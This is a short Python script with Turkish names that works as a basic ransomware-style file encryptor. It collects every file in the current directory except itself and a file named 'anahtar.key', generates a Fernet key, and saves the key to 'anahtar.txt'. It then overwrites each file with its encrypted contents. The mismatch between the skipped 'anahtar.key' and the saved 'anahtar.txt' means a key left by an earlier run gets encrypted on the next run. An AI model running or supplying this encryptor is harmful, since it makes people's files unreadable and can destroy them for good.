import os
from cryptography.fernet import Fernet

dosyalar = []

for dosya in os.listdir():
    if dosya == "sifrele.py" or dosya == "anahtar.key":
        continue
    if os.path.isfile(dosya):
        dosyalar.append(dosya)
print(dosyalar)

anahtar = Fernet.generate_key()
with open("anahtar.txt", 'wb') as anahtar_dosya:
    anahtar_dosya.write(anahtar)

for dosya in dosyalar:
    with open(dosya, "rb") as okunan_dosya:
        icerik = okunan_dosya.read()
        sifreli_icerik = Fernet(anahtar).encrypt(icerik)
        with open(dosya, "wb") as sifrelenen_dosya:
            sifrelenen_dosya.write(sifreli_icerik)